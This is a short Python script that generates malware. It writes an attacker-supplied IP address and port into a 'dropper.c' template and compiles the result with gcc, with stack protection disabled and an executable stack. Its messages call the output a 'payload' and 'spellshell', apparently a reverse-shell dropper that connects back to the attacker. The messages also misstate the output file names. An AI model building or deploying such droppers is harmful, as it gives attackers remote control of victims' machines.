import sys
import subprocess

def help():
	print("Usage:\tinnogen.py {IP} {PORT}")

def create(IP, PORT):
	with open("dropper.c", "r") as temp, open("output.c", "w") as pay:
		l=temp.readlines()
		l[0]=f'#define IP "{IP}"'
		l[1]=f'#define PORT {PORT}'

		for line in l:
			pay.write(line+"\n")

		print("[+] payload saved to payload_spellshell.c")


	cmd=subprocess.Popen(['gcc', '-fno-stack-protector', '-z', 'execstack', '-o', 'output', 'output.c'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out=cmd.stdout.read()
	print("[+] code saved as output.c and executable created as output.c")

try:
	(IP, PORT)=(sys.argv[1], int(sys.argv[2]))
except:
	help()
	exit()

create(IP, PORT)